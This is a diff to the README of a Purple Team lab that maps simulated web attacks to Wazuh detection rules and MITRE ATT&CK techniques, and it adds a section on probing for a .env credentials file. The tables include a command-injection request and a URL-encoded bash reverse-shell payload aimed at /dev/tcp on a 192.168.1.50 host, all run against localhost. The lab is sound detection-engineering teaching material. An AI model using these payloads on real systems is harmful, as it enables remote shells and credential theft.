@@ -12,6 +12,7 @@ A hands-on Purple Team lab demonstrating end-to-end web attack detection, log te
 * [Active Recon](#active-recon)
 * [Initial Access & Exploitation](#initial-access--exploitation)
 * [Execution](#-execution-ta0002--t1059)
+* [Credential Access](#-credential-access-ta0006--t1552001)
 * [SOC Analyst Investigation Flow](#-soc-analyst-investigation-flow)
 
 ---
@@ -108,7 +109,15 @@ php -S localhost:8000
 | **Command Injection (RCE)** | `curl "http://localhost:8000/index.php?cmd=whoami"` | **T1059** (Command and Scripting Interpreter) | **100070** | The custom correlation rule inspected incoming HTTP request parameters and matched high-severity OS execution commands (`whoami`), raising a Level 12 security alert. |
 | **Reverse Shell / Web Shell Interaction** | `curl "http://localhost:8000/index.php?cmd=bash%20-i%20%3E&%20/dev/tcp/192.168.1.50/4444%200%3E&1"` | **T1505.003** (Web Shell) / **T1059.004** (Unix Shell) | **100080** | The custom detection rule identified high-risk execution query parameters (`?cmd=`) passing an interactive TCP reverse shell payload (`/dev/tcp/`), triggering a Level 11 alert for web backdoor activity. |
 
-## 🔍 SOC Analyst Investigation Flow
+---
+
+## Credential Access (TA0006 / T1552.001)
+
+| Attack Vector | Payload / Command Used | MITRE ATT&CK | Wazuh Rule ID | Why We Got the Alert |
+| :--- | :--- | :--- | :--- | :--- |
+| **Sensitive File Exposure (`.env`)** | `curl "http://localhost:8000/.env"` | **T1552.001** (Unsecured Credentials: Credentials in Files) | **100090** | The custom detection rule inspected incoming URI paths and matched a probe attempting to access environment configuration files (`.env`) containing secret keys, database credentials, or API tokens, triggering a Level 10 alert. |
+
+##  SOC Analyst Investigation Flow
 
 1. Open **Wazuh Dashboard** -> **Threat Hunting** -> **Events**.
 2. Filter by Agent & Web rules:
